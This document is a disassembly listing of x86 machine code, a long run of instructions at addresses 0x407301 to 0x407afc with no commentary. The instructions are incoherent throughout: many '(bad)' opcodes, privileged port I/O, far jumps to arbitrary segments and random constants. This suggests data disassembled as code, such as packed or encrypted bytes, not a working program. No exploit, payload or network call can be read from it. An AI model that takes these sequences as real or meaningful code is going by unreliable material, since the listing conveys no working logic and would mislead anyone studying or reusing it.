  407301:	cmp    eax,edi
  407303:	mov    dh,0x5f
  407305:	mov    edi,0x8ab956c8
  40730a:	ret    0x99aa
  40730d:	icebp  
  40730e:	stos   BYTE PTR es:[edi],al
  40730f:	inc    ebp
  407310:	ds out 0xdc,al
  407313:	lods   eax,DWORD PTR cs:[esi]
  407315:	and    eax,0x604b1325
  40731a:	test   BYTE PTR [bp+si],bh
  40731d:	retf   
  40731e:	jmp    0xe1c2:0xb9ad82dc
  407325:	and    eax,0xa10a12cc
  40732a:	bound  ecx,QWORD PTR [edi+0xd]
  40732d:	add    BYTE PTR ds:0x7b24df5a,0xb6
  407334:	adc    al,0x5
  407336:	mov    edx,DWORD PTR [eax]
  407338:	repnz or ch,BYTE PTR [edi]
  40733b:	retf   0xc73e
  40733e:	(bad)  
  40733f:	adc    bh,cl
  407341:	shl    DWORD PTR [ebp-0x68922d8e],cl
  407347:	push   eax
  407348:	or     edi,DWORD PTR [eax-0x7cc1da33]
  40734e:	and    DWORD PTR [edi-0x4a77d3bc],esi
  407354:	pop    DWORD PTR [eax-0x44]
  407357:	xor    ah,BYTE PTR [eax-0x2e]
  40735a:	addr16 retf 
  40735c:	ret    
  40735d:	mov    ebx,0xed47e8c9
  407362:	das    
  407363:	add    DWORD PTR [edi-0x1b3e9537],eax
  407369:	mov    ebp,0xa4ee8109
  40736e:	push   esi
  40736f:	mov    ss,WORD PTR [edx]
  407371:	jbe    0x4073ef
  407373:	aas    
  407374:	add    BYTE PTR [esp+eax*2],0x4e
  407378:	mov    bh,0xb5
  40737a:	or     BYTE PTR [eax-0x45816e3c],cl
  407380:	inc    ebx
  407381:	xchg   edi,eax
  407382:	lds    edx,FWORD PTR [edi-0x594df0d8]
  407388:	daa    
  407389:	fnstcw WORD PTR [edx]
  40738b:	inc    edi
  40738c:	adc    ebx,DWORD PTR [edi+0x704e8a2a]
  407392:	or     eax,0x4457722
  407397:	add    DWORD PTR [ebp-0x70d66754],esp
  40739d:	retf   0x4bec
  4073a0:	les    eax,FWORD PTR [ecx-0x56]
  4073a3:	cmp    al,0x7c
  4073a5:	ins    BYTE PTR es:[edi],dx
  4073a6:	cmc    
  4073a7:	pop    ebp
  4073a8:	push   0xffffff9e
  4073aa:	sub    al,0xb6
  4073ac:	and    eax,DWORD PTR [edi-0x30a6bf40]
  4073b2:	gs je  0x407351
  4073b5:	push   eax
  4073b6:	dec    ecx
  4073b7:	add    bh,ah
  4073b9:	cmp    ecx,ebp
  4073bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4073bc:	lock shr DWORD PTR [ebx-0x4d1a4f5e],0x21
  4073c4:	add    dl,dl
  4073c6:	aas    
  4073c7:	fstp   DWORD PTR [eax-0x53]
  4073ca:	out    0x78,eax
  4073cc:	dec    edx
  4073cd:	dec    ebx
  4073ce:	pop    es
  4073cf:	cmp    BYTE PTR [ebx],dh
  4073d1:	imul   esi,DWORD PTR [eax-0x3643c658],0xa5aecbed
  4073db:	xchg   ebx,eax
  4073dc:	rol    BYTE PTR [edx-0x43],cl
  4073df:	test   eax,0xb43a134b
  4073e4:	enter  0xc7f7,0x8f
  4073e8:	mov    ch,0x1e
  4073ea:	fiadd  WORD PTR [ebp+0x71]
  4073ed:	(bad)  
  4073ee:	call   0x354c:0x40a70285
  4073f5:	sub    esp,0x6d8e370e
  4073fb:	sbb    eax,0xeb1ddcc4
  407400:	push   ebp
  407401:	or     al,0x5a
  407403:	(bad)  [ecx+0x1eaf8add]
  407409:	xchg   edx,eax
  40740a:	and    eax,0xcdf96ec5
  40740f:	inc    ecx
  407410:	test   DWORD PTR [esi],edx
  407412:	sub    DWORD PTR [eax],ebp
  407414:	add    eax,0x90a92920
  407419:	cmc    
  40741a:	jge    0x4073c3
  40741c:	jno    0x407475
  40741e:	inc    eax
  40741f:	push   esi
  407420:	mov    esi,0x8c75c3f2
  407425:	push   ss
  407426:	cmp    ch,cl
  407428:	loop   0x407487
  40742a:	imul   edx,ebx,0x6aab8b70
  407430:	arpl   WORD PTR [ebp-0x23],ax
  407433:	push   ds
  407434:	mov    bh,0x3b
  407436:	cmp    eax,0xb33a7e88
  40743b:	mov    ds:0x1dd1545e,eax
  407440:	sti    
  407441:	fwait
  407442:	dec    ecx
  407443:	repnz mov dh,0xc8
  407446:	adc    al,0xa3
  407448:	in     al,dx
  407449:	lds    edx,FWORD PTR [ebp+0x5975f911]
  40744f:	mov    cl,0x56
  407451:	imul   edx,DWORD PTR [eax],0xa0f16478
  407457:	int    0x29
  407459:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40745a:	lea    ecx,[eax-0x623ed963]
  407460:	outs   dx,DWORD PTR ds:[esi]
  407461:	mov    ebp,edx
  407463:	sub    DWORD PTR [ebp+0x65],0x3c
  407467:	into   
  407468:	cmc    
  407469:	out    0xfa,eax
  40746b:	aaa    
  40746c:	test   BYTE PTR [esi-0x24],al
  40746f:	push   0x53e4c321
  407474:	daa    
  407475:	icebp  
  407476:	jmp    0xb62d:0xd17d0895
  40747d:	in     eax,0x4
  40747f:	cld    
  407480:	pop    ebp
  407481:	jns    0x407415
  407483:	fwait
  407484:	xchg   edx,eax
  407485:	hlt    
  407486:	push   ebx
  407487:	(bad)  
  407488:	adc    BYTE PTR fs:[edx+0x407f200d],0x18
  407490:	inc    edi
  407491:	gs es pushf 
  407494:	dec    edi
  407495:	dec    esi
  407496:	mov    esp,0x636765c
  40749b:	sub    eax,esi
  40749d:	xchg   ebx,eax
  40749e:	fs mov eax,0x9b9e261a
  4074a4:	push   esi
  4074a5:	rcr    BYTE PTR [ebx+ebp*2+0x2c],cl
  4074a9:	mov    bh,0x39
  4074ab:	or     DWORD PTR [eax],ecx
  4074ad:	cli    
  4074ae:	arpl   WORD PTR [ebp-0x52],si
  4074b1:	push   edi
  4074b2:	cmp    esp,esp
  4074b4:	aam    0x71
  4074b6:	xchg   BYTE PTR [edi*8+0x5c9f827f],al
  4074bd:	mov    esi,0x6339ff35
  4074c2:	jge    0x4074f4
  4074c4:	and    ebx,edi
  4074c6:	inc    ebx
  4074c7:	loop   0x4074c8
  4074c9:	pop    ds
  4074ca:	(bad)  
  4074cb:	sub    al,0xf1
  4074cd:	js     0x4074d4
  4074cf:	dec    ecx
  4074d0:	cmc    
  4074d1:	and    al,0x33
  4074d3:	(bad)  
  4074d4:	les    edx,FWORD PTR [edx]
  4074d6:	popa   
  4074d7:	sbb    BYTE PTR [edx+eiz*2],dl
  4074da:	pop    ebx
  4074db:	shr    BYTE PTR [ebx+ecx*1],0x43
  4074df:	pop    esi
  4074e0:	cmp    al,0xee
  4074e2:	sub    al,0x24
  4074e4:	shl    al,0xf8
  4074e7:	sahf   
  4074e8:	mov    ds:0xffae938f,al
  4074ed:	dec    ebp
  4074ee:	test   eax,0xcc5320f5
  4074f3:	mov    ebp,DWORD PTR [ebp-0x1cd01661]
  4074f9:	sbb    BYTE PTR [eax-0x12],bh
  4074fc:	pop    edi
  4074fd:	dec    ebx
  4074fe:	sbb    dl,BYTE PTR [edx+0xc]
  407501:	mov    WORD PTR [ecx],cs
  407503:	or     DWORD PTR [eax],edi
  407505:	fadd   DWORD PTR [ecx-0x28]
  407508:	push   DWORD PTR [ecx+0x6e]
  40750b:	cld    
  40750c:	xchg   ebp,eax
  40750d:	dec    edx
  40750e:	push   ds
  40750f:	imul   ebx,DWORD PTR [edx+0x2a58e367],0xc829272e
  407519:	sub    eax,0x7ef10230
  40751e:	sbb    BYTE PTR [ecx+eax*1],ah
  407521:	mov    dh,0xfd
  407523:	sub    eax,0xf7b32bc1
  407528:	xrelease mov DWORD PTR [esi+0x17],esp
  40752c:	pop    ebp
  40752d:	sbb    bl,BYTE PTR [ecx]
  40752f:	and    dl,BYTE PTR [ecx+0x4cfbbbe4]
  407535:	int    0xf7
  407537:	mov    eax,0x3a03b522
  40753c:	cmp    edi,DWORD PTR [edx]
  40753e:	mov    edi,0x920bfe1
  407543:	jmp    0x9b687b98
  407548:	mov    esi,0xdf741202
  40754d:	mov    eax,0xc894a93d
  407552:	sbb    eax,0x6d6b5dd3
  407557:	and    BYTE PTR [esi+eiz*2],bl
  40755a:	popf   
  40755b:	push   cs
  40755c:	sub    eax,0x9bd45e5c
  407561:	and    eax,0x7b8f99fd
  407566:	mov    ecx,0xc29f4a60
  40756b:	int    0xff
  40756d:	sub    al,BYTE PTR [ecx-0x832fe93]
  407573:	mov    bl,0xa1
  407575:	mov    bh,0x8f
  407577:	xchg   edx,eax
  407578:	out    0xf6,al
  40757a:	sbb    BYTE PTR [ebx],al
  40757c:	in     eax,0xe8
  40757e:	and    al,0x59
  407580:	test   al,0xbb
  407582:	arpl   WORD PTR [eax],cx
  407584:	mov    ebx,0x2fe37a5e
  407589:	cmovp  esi,edx
  40758c:	cmp    esi,ebx
  40758e:	adc    eax,0x5c82d241
  407593:	mov    WORD PTR [edx],ss
  407595:	push   esi
  407596:	or     dl,BYTE PTR [edi]
  407598:	icebp  
  407599:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40759a:	push   es
  40759b:	mov    ecx,0xb625d0c5
  4075a0:	leave  
  4075a1:	inc    esi
  4075a2:	lea    esp,[edx-0xd20b5b0]
  4075a8:	aad    0x2a
  4075aa:	xchg   edx,eax
  4075ab:	sub    eax,0x4e3bf143
  4075b0:	add    BYTE PTR [ebx+eax*2],ah
  4075b3:	xchg   edi,eax
  4075b4:	jns    0x4075cc
  4075b6:	sub    BYTE PTR [eax+0x6aa959a6],ah
  4075bc:	jnp    0x40755d
  4075be:	xchg   esi,eax
  4075bf:	jmp    0x1d89e718
  4075c4:	push   0xecd52602
  4075c9:	adc    DWORD PTR [edx+0x4e2dcc09],eax
  4075cf:	sbb    ecx,ecx
  4075d1:	sub    bl,dh
  4075d3:	push   ecx
  4075d4:	dec    edx
  4075d5:	test   eax,0x22ac211e
  4075da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4075db:	push   0x5b
  4075dd:	or     eax,0x9c4ecc9a
  4075e2:	aad    0x44
  4075e4:	add    edi,DWORD PTR ds:0x42dbd11
  4075ea:	scas   al,BYTE PTR es:[edi]
  4075eb:	loopne 0x4075dd
  4075ed:	mov    WORD PTR [edx+eiz*4-0x62413e29],es
  4075f4:	xor    DWORD PTR [ebx+0x7],esp
  4075f7:	repz fcmovnb st,st(7)
  4075fa:	and    al,dl
  4075fc:	pop    ss
  4075fd:	in     al,0x5e
  4075ff:	pop    ebp
  407600:	mov    ebp,0x6363219f
  407605:	test   eax,0x36ef2b55
  40760a:	inc    edi
  40760b:	jno    0x40763b
  40760d:	and    DWORD PTR [edi-0x75],esi
  407610:	jl     0x4075e4
  407612:	pop    ds
  407613:	dec    eax
  407614:	addr16 or edx,0xffffffb8
  407618:	and    bh,BYTE PTR [esi+0x55f4db04]
  40761e:	arpl   si,si
  407620:	mov    ah,BYTE PTR [esi+0x7a733a0d]
  407626:	fsubp  st(2),st
  407628:	xchg   edx,eax
  407629:	jns    0x4075bc
  40762b:	jnp    0x407666
  40762d:	jns    0x407643
  40762f:	retf   0xf7f6
  407632:	loop   0x407620
  407634:	retf   
  407635:	mov    al,ds:0xe7fadce6
  40763a:	jg     0x407607
  40763c:	sbb    eax,0xc688ba94
  407641:	pop    ebp
  407642:	adc    al,0xcc
  407644:	sbb    BYTE PTR [ecx],dh
  407646:	test   eax,0x51adf5d
  40764b:	es push esi
  40764d:	stos   BYTE PTR es:[edi],al
  40764e:	fwait
  40764f:	sub    esp,DWORD PTR [edi-0x3]
  407652:	into   
  407653:	dec    edx
  407654:	aas    
  407655:	or     DWORD PTR [edx+eax*1-0x48618676],esp
  40765c:	adc    al,0x4e
  40765e:	sbb    ah,bl
  407660:	(bad)  
  407661:	xchg   edi,eax
  407662:	add    DWORD PTR [eax-0x10],edi
  407665:	mul    DWORD PTR [edx]
  407667:	xchg   ebx,eax
  407668:	mov    ebp,0xaadf2ea3
  40766d:	push   edx
  40766e:	sti    
  40766f:	xor    edi,DWORD PTR [esi-0x15bdeb1b]
  407675:	pop    edx
  407676:	pop    ds
  407677:	mov    dh,0xd0
  407679:	iret   
  40767a:	and    al,dl
  40767c:	jmp    0x4076d7
  40767e:	or     BYTE PTR [edx],dl
  407680:	cmp    bh,ch
  407682:	sub    ebp,DWORD PTR [ecx]
  407684:	dec    ebp
  407685:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407686:	cs iret 
  407688:	push   es
  407689:	arpl   WORD PTR [ebx+0x2b],ax
  40768c:	inc    ecx
  40768d:	test   BYTE PTR [eax-0x47],ah
  407690:	sbb    al,0xf4
  407692:	xchg   esp,eax
  407693:	add    al,al
  407695:	jl     0x40761a
  407697:	loop   0x40770e
  407699:	push   ebp
  40769a:	(bad)  
  40769b:	dec    eax
  40769c:	xor    BYTE PTR [ecx-0x65],bh
  40769f:	into   
  4076a0:	std    
  4076a1:	in     al,dx
  4076a2:	(bad)  
  4076a3:	daa    
  4076a4:	jecxz  0x40767b
  4076a6:	retf   0x3f98
  4076a9:	and    ebx,DWORD PTR [edi+0xa]
  4076ac:	push   0xffffffe6
  4076ae:	aas    
  4076af:	call   0x54006c43
  4076b4:	add    BYTE PTR [ebx+0x12ac5427],0xbe
  4076bb:	xor    BYTE PTR [edx],dl
  4076bd:	add    al,0x23
  4076bf:	jae    0x4076ef
  4076c1:	mov    dh,0xb1
  4076c3:	nop
  4076c4:	pop    es
  4076c5:	or     al,0xb5
  4076c7:	or     eax,edx
  4076c9:	jp     0x407706
  4076cb:	inc    ebx
  4076cc:	stos   DWORD PTR es:[edi],eax
  4076cd:	dec    ebx
  4076ce:	and    al,0xef
  4076d0:	or     eax,0x6b681d8e
  4076d5:	sbb    al,0xc9
  4076d7:	jmp    0xbf95bea0
  4076dc:	(bad)  
  4076dd:	ins    DWORD PTR es:[edi],dx
  4076de:	test   eax,0xe9709327
  4076e3:	mov    edi,0x8acaa9f5
  4076e8:	sub    al,0x96
  4076ea:	(bad)  
  4076eb:	cdq    
  4076ec:	sbb    eax,0x70bd7eab
  4076f1:	jb     0x40776f
  4076f3:	and    ch,al
  4076f5:	jmp    0x7a21:0xf46c9139
  4076fc:	cmp    al,0xeb
  4076fe:	add    DWORD PTR [ebx-0x19db42ef],ebx
  407704:	dec    ebp
  407705:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407706:	xchg   esp,eax
  407707:	sar    ch,1
  407709:	cmc    
  40770a:	enter  0x43cf,0x38
  40770e:	popa   
  40770f:	scas   al,BYTE PTR es:[edi]
  407710:	(bad)  
  407711:	and    BYTE PTR [ecx-0x39],al
  407714:	cmp    DWORD PTR ds:0xbaee045a,edx
  40771a:	js     0x4076c5
  40771c:	mov    esp,ds
  40771e:	and    BYTE PTR [eax-0x414b58f0],cl
  407724:	inc    ecx
  407725:	mov    al,ds:0xe4f733dd
  40772a:	cmc    
  40772b:	xchg   edx,eax
  40772c:	sbb    DWORD PTR [ebx-0x4b82fb2a],0x1c
  407733:	ds cwde 
  407735:	fdivr  DWORD PTR ds:0x7e9252
  40773b:	sbb    esi,DWORD PTR [edi+ebp*1]
  40773e:	clc    
  40773f:	jne    0x4076dc
  407741:	int    0x7d
  407743:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407744:	fcmovnbe st,st(0)
  407746:	in     al,0x13
  407748:	sbb    al,ah
  40774a:	(bad)  
  40774b:	mov    eax,ds:0xc4920450
  407750:	mov    dl,0x59
  407752:	or     eax,0xeaae7e1b
  407757:	pop    edi
  407758:	xchg   DWORD PTR [edx+0x429291f7],eax
  40775e:	cmp    eax,0x2d0ce283
  407763:	mov    eax,0x38cf8046
  407768:	aaa    
  407769:	lock sbb eax,0xf9861d96
  40776f:	retf   
  407770:	xor    eax,0x4421fec5
  407775:	push   ecx
  407776:	mov    ebp,0x1e2215d5
  40777b:	dec    ebx
  40777c:	(bad)  
  40777d:	xchg   esi,esi
  40777f:	dec    ecx
  407780:	cmc    
  407781:	xor    eax,0x2ad7108c
  407786:	xor    al,0xab
  407788:	and    dl,BYTE PTR [edi+0x52]
  40778b:	jo     0x407799
  40778d:	cmp    bp,WORD PTR [edx+eiz*2]
  407791:	xchg   edi,eax
  407792:	les    esi,FWORD PTR [edx+eax*2+0x54]
  407796:	test   DWORD PTR [edi+0x5c],eax
  407799:	xchg   edi,eax
  40779a:	jb     0x40778d
  40779c:	pop    ebx
  40779d:	mov    al,0xb8
  40779f:	adc    esp,edi
  4077a1:	mov    eax,DWORD PTR [esi-0xe]
  4077a4:	scas   eax,DWORD PTR es:[edi]
  4077a5:	push   ebp
  4077a6:	xchg   edx,eax
  4077a7:	(bad)  
  4077a8:	enter  0xf9fa,0x23
  4077ac:	pop    dx
  4077ae:	push   ebp
  4077af:	xchg   esi,eax
  4077b0:	daa    
  4077b1:	ret    
  4077b2:	xchg   edi,ecx
  4077b4:	xor    al,0x3
  4077b6:	lods   al,BYTE PTR ds:[esi]
  4077b7:	int    0xe7
  4077b9:	sbb    esi,ebx
  4077bb:	popf   
  4077bc:	imul   eax,DWORD PTR [esi-0x4ae12e60],0x90d4fe5c
  4077c6:	mov    es,edx
  4077c8:	int3   
  4077c9:	adc    DWORD PTR [ecx-0x51],ebx
  4077cc:	enter  0x8d9e,0xeb
  4077d0:	push   edi
  4077d1:	loop   0x407809
  4077d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4077d4:	mov    ecx,0x8ea02108
  4077d9:	dec    ebx
  4077da:	nop
  4077db:	push   es
  4077dc:	cld    
  4077dd:	mov    bh,0x17
  4077df:	pop    ecx
  4077e0:	clc    
  4077e1:	sti    
  4077e2:	jmp    0x40784d
  4077e4:	xchg   esp,eax
  4077e5:	mov    dh,0x6b
  4077e7:	mov    bl,0x35
  4077e9:	stos   BYTE PTR es:[edi],al
  4077ea:	ficom  DWORD PTR [eax+ebx*1]
  4077ed:	dec    ecx
  4077ee:	sti    
  4077ef:	inc    eax
  4077f0:	xor    al,0x87
  4077f2:	mov    ecx,DWORD PTR ds:0x4542cb91
  4077f8:	das    
  4077f9:	loopne 0x407814
  4077fb:	or     BYTE PTR [eax+eiz*4+0x51],0x75
  407800:	mov    edi,0x9c4263dc
  407805:	mov    cl,0xd
  407807:	dec    esp
  407808:	or     al,0x70
  40780a:	fadd   QWORD PTR [ecx-0x40]
  40780d:	or     al,0x67
  40780f:	and    eax,0xf0406a5e
  407814:	xor    DWORD PTR [edx],0xffffffa5
  407817:	jge    0x4077f7
  407819:	je     0x4077c4
  40781b:	aad    0x18
  40781d:	xor    cl,BYTE PTR [ebx]
  40781f:	pop    esi
  407820:	fldenv [esi-0x628a4957]
  407826:	push   eax
  407827:	(bad)  
  407829:	inc    ebx
  40782a:	test   DWORD PTR [edi-0x28c45b85],eax
  407830:	mov    ah,ch
  407832:	mov    bh,0x19
  407834:	inc    edx
  407835:	(bad)  
  407836:	fist   DWORD PTR [edx+0x69]
  407839:	daa    
  40783a:	enter  0xfa8a,0xa3
  40783e:	in     al,dx
  40783f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407840:	mov    ch,BYTE PTR [esi]
  407842:	jge    0x407879
  407844:	sbb    DWORD PTR [edx+0x6d],0x79803699
  40784b:	xchg   esi,eax
  40784c:	push   eax
  40784d:	pop    edx
  40784e:	in     al,dx
  40784f:	xchg   ebp,eax
  407850:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407851:	inc    ebx
  407852:	push   eax
  407853:	push   eax
  407854:	outs   dx,BYTE PTR ds:[esi]
  407855:	pop    esp
  407856:	call   0xee10:0x170f7469
  40785d:	adc    DWORD PTR [esi+0x122827ca],esp
  407863:	inc    ecx
  407864:	mov    edx,0x3d472a0a
  407869:	jae    0x407812
  40786b:	dec    ebx
  40786c:	mov    bh,0xd3
  40786e:	sar    DWORD PTR [ecx+0x5036209b],0xc
  407875:	out    dx,al
  407876:	or     BYTE PTR [esi-0x5d820595],0x3c
  40787d:	icebp  
  40787e:	ret    0x472e
  407881:	jb     0x4078b0
  407883:	pop    ds
  407884:	xchg   edi,eax
  407885:	out    0xa9,eax
  407887:	fisttp QWORD PTR [ecx+0x404ae9be]
  40788d:	aas    
  40788e:	(bad)  [ecx]
  407890:	pop    ecx
  407891:	mov    dh,0x70
  407893:	je     0x407821
  407895:	scas   al,BYTE PTR es:[edi]
  407896:	jle    0x407863
  407898:	xchg   BYTE PTR [ebx+eax*4+0x61],cl
  40789c:	cmp    ecx,DWORD PTR [ebx-0x1c]
  40789f:	sbb    BYTE PTR [edi+0x46f2cd00],ah
  4078a5:	push   edi
  4078a6:	add    DWORD PTR [ecx+0x1c092996],ebx
  4078ac:	data16 or BYTE PTR [ebp+ebp*8+0x59],ah
  4078b1:	imul   eax,DWORD PTR [edi+0x1c],0xeaaae547
  4078b8:	xchg   esi,eax
  4078b9:	ins    DWORD PTR es:[edi],dx
  4078ba:	iret   
  4078bb:	sub    ah,bh
  4078bd:	pusha  
  4078be:	pop    esi
  4078bf:	push   0xeee36d11
  4078c4:	mov    dl,0x9
  4078c6:	loopne 0x407856
  4078c8:	cmp    bh,BYTE PTR [esi+ebx*8]
  4078cb:	mov    ecx,0xca4c4b24
  4078d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4078d1:	mov    dh,0xc3
  4078d3:	test   eax,0xdb1f8fc0
  4078d8:	jg     0x4078e6
  4078da:	xchg   ebx,eax
  4078db:	bound  esi,QWORD PTR [ecx+0x5f]
  4078de:	arpl   WORD PTR [edi],bp
  4078e0:	int3   
  4078e1:	mov    DWORD PTR [esi],esi
  4078e3:	pop    esp
  4078e4:	mov    edx,0x839d3c13
  4078e9:	mov    al,ds:0x76e936bd
  4078ee:	dec    edi
  4078ef:	mov    ch,0x1d
  4078f1:	(bad)  
  4078f2:	repz cmp dh,ch
  4078f5:	jae    0x407905
  4078f7:	push   0x217ca89a
  4078fc:	mov    edx,0x31692b1e
  407901:	std    
  407902:	test   al,0xe
  407904:	hlt    
  407905:	int    0xef
  407907:	inc    DWORD PTR [edi]
  407909:	shl    DWORD PTR [ebx-0x120ab375],1
  40790f:	dec    edi
  407910:	sub    al,0xea
  407912:	sub    BYTE PTR [esp+edx*2-0x5c],cl
  407916:	adc    al,0x20
  407918:	ret    0xc8c
  40791b:	das    
  40791c:	mov    ds:0xad7f5a3d,eax
  407921:	push   edx
  407922:	xchg   ebp,eax
  407923:	sub    BYTE PTR [eax],dh
  407925:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407926:	xchg   ecx,eax
  407927:	xchg   ecx,eax
  407928:	or     eax,DWORD PTR [esi+ebx*1+0x52]
  40792c:	jmp    FWORD PTR [ebx+0x6b4821e3]
  407932:	jae    0x4079a0
  407934:	mov    dl,0x3
  407936:	fild   WORD PTR [ebp-0x21c4fa62]
  40793c:	sahf   
  40793d:	jge    0x4079b4
  40793f:	cmp    al,0x35
  407941:	out    dx,eax
  407942:	push   cs
  407943:	sti    
  407944:	inc    ecx
  407945:	out    dx,al
  407946:	aad    0xd3
  407948:	or     BYTE PTR [edx-0x6a4dcf08],ch
  40794e:	add    al,0x29
  407950:	inc    ecx
  407951:	jp     0x407939
  407953:	inc    esi
  407954:	jmp    0xd516eef
  407959:	cmp    ebx,DWORD PTR [edx-0x6a]
  40795c:	in     al,0x46
  40795e:	ss mov ecx,0x4a083309
  407964:	or     DWORD PTR [ecx+0x70],edi
  407967:	mov    al,0x4e
  407969:	or     DWORD PTR [edx-0x25],edx
  40796c:	mov    ebp,0x456beb19
  407971:	sbb    DWORD PTR [ebx-0x54],0xb7bd6464
  407978:	ret    0x9593
  40797b:	or     al,0x40
  40797d:	pop    edi
  40797e:	xchg   BYTE PTR ss:[edx+edx*4+0x722f2a1b],dh
  407986:	sub    cl,dh
  407988:	popa   
  407989:	aas    
  40798a:	jne    0x4079d7
  40798c:	sbb    BYTE PTR [ecx],bl
  40798e:	xchg   ebp,eax
  40798f:	in     al,0xd7
  407991:	mov    bh,0xed
  407993:	enter  0xcf72,0xce
  407997:	add    cl,bl
  407999:	push   ebx
  40799a:	adc    DWORD PTR [esi],esi
  40799c:	cld    
  40799d:	mov    esp,0x36277ddb
  4079a2:	in     al,0xcb
  4079a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4079a5:	loop   0x407967
  4079a7:	out    dx,al
  4079a8:	jecxz  0x407936
  4079aa:	sub    eax,0x980eab06
  4079af:	jmp    0xec8:0xb502a210
  4079b6:	push   edi
  4079b7:	push   es
  4079b8:	mov    WORD PTR [edi+0x1a],gs
  4079bb:	inc    edx
  4079bc:	es out 0x75,al
  4079bf:	sbb    edi,ebp
  4079c1:	daa    
  4079c2:	(bad)
  4079c5:	cwde   
  4079c6:	pusha  
  4079c7:	and    DWORD PTR [esi-0x72],edx
  4079ca:	fcomp  QWORD PTR [ebp+0x76]
  4079cd:	xor    eax,0x58eb837a
  4079d2:	out    0xac,eax
  4079d4:	pop    ebx
  4079d5:	inc    eax
  4079d6:	data16 into 
  4079d8:	sbb    cl,BYTE PTR [edx-0x47]
  4079db:	jp     0x4079da
  4079dd:	push   eax
  4079de:	sbb    eax,edi
  4079e0:	iret   
  4079e1:	push   DWORD PTR [edi-0x2c207e4f]
  4079e7:	addr16 ss dec edi
  4079ea:	mov    esi,0x486be77b
  4079ef:	popa   
  4079f0:	push   eax
  4079f1:	inc    ebp
  4079f2:	daa    
  4079f3:	fnsave [edx]
  4079f5:	clc    
  4079f6:	test   DWORD PTR [edi+0x6d24e2ce],esi
  4079fc:	xor    al,dh
  4079fe:	cmp    BYTE PTR [edi+0x34],ah
  407a01:	arpl   WORD PTR [ecx+ebp*4+0x2aa5b17e],bx
  407a08:	(bad)  
  407a09:	sub    ebp,DWORD PTR [ebx]
  407a0b:	out    0x93,eax
  407a0d:	push   0x7d8c1e05
  407a12:	shl    ebx,1
  407a14:	pop    ss
  407a15:	lods   al,BYTE PTR ds:[esi]
  407a16:	int3   
  407a17:	fild   WORD PTR [eax+ebp*4]
  407a1a:	(bad)  
  407a1b:	cmp    eax,0xbf7196ae
  407a20:	mov    bl,0x94
  407a22:	out    0x3f,eax
  407a24:	addr16 mov cl,0x91
  407a27:	sub    al,0xb4
  407a29:	pusha  
  407a2a:	pop    ds
  407a2b:	adc    eax,0xc1bb2391
  407a30:	add    ch,BYTE PTR [esi]
  407a32:	mov    ecx,0xd3a03403
  407a37:	sbb    esi,0xffffff9f
  407a3a:	push   es
  407a3b:	mov    al,0xef
  407a3d:	imul   esp,DWORD PTR [eax],0xe6ff7563
  407a43:	ins    BYTE PTR es:[edi],dx
  407a44:	sbb    DWORD PTR [esp+edx*2-0x43],ecx
  407a48:	pop    ss
  407a49:	div    DWORD PTR [ebx+0x584dd944]
  407a4f:	inc    esi
  407a50:	cmc    
  407a51:	loop   0x407aad
  407a53:	mov    ah,0xf8
  407a55:	sahf   
  407a56:	push   ss
  407a57:	mov    ds:0x796f3f1c,al
  407a5c:	inc    esi
  407a5d:	cdq    
  407a5e:	call   0x5bfcf06c
  407a63:	sbb    al,0x39
  407a65:	fcom   DWORD PTR [esi]
  407a67:	adc    eax,0x83f9f8d
  407a6c:	mov    ebx,ebp
  407a6e:	push   esp
  407a6f:	cmp    ebx,DWORD PTR [esi-0x16ed2640]
  407a75:	mov    ah,0xdc
  407a77:	mov    eax,0xf0773d32
  407a7c:	std    
  407a7d:	stos   BYTE PTR es:[edi],al
  407a7e:	xchg   ecx,eax
  407a7f:	mov    esp,0x4960bffe
  407a84:	mov    edx,0xf119bc60
  407a89:	arpl   WORD PTR [eax],si
  407a8b:	mov    bl,0x1f
  407a8d:	sbb    DWORD PTR [edi-0x5b],esp
  407a90:	mov    DWORD PTR [eax+0x5f],edx
  407a93:	fldcw  WORD PTR [esi-0x51]
  407a96:	xchg   ebp,eax
  407a97:	dec    edi
  407a98:	test   eax,0x3dd4a48a
  407a9d:	xchg   ecx,eax
  407a9e:	jecxz  0x407b04
  407aa0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407aa1:	popf   
  407aa2:	(bad)  
  407aa3:	xchg   edi,eax
  407aa4:	fadd   st,st(4)
  407aa6:	cmp    al,0xb0
  407aa8:	das    
  407aa9:	sti    
  407aaa:	xchg   edi,eax
  407aab:	sub    ecx,ebx
  407aad:	adc    cl,BYTE PTR [ebx]
  407aaf:	sti    
  407ab0:	and    ah,BYTE PTR [edx+edx*4]
  407ab3:	jmp    0x7b89e386
  407ab8:	xor    DWORD PTR [eax-0x2a8bac09],edi
  407abe:	xchg   ebx,eax
  407abf:	mov    ah,BYTE PTR [ebx+0x4b5fb9f6]
  407ac5:	add    DWORD PTR [ebp+0x1052cfe1],ebx
  407acb:	mov    ds:0x7a325c4c,al
  407ad0:	and    DWORD PTR [esi+0x7f],eax
  407ad3:	or     ch,dh
  407ad5:	push   0x6c7a07f0
  407ada:	jne    0x407a6c
  407adc:	inc    ebp
  407add:	pop    ebx
  407ade:	pop    edx
  407adf:	jbe    0x407ad9
  407ae1:	ins    DWORD PTR es:[edi],dx
  407ae2:	mov    edx,DWORD PTR [edx+0x29]
  407ae5:	icebp  
  407ae6:	cs mov ?,eax
  407ae9:	or     DWORD PTR [ebx-0x2],ebp
  407aec:	xchg   sp,ax
  407aee:	cmp    bh,BYTE PTR [edx+0x50]
  407af1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407af2:	pop    ecx
  407af3:	xor    dh,BYTE PTR [ecx+esi*8]
  407af6:	sahf   
  407af7:	add    BYTE PTR gs:[edi+ebp*4-0x47],dl
  407afc:	mov    al,ds:0x78969fe7
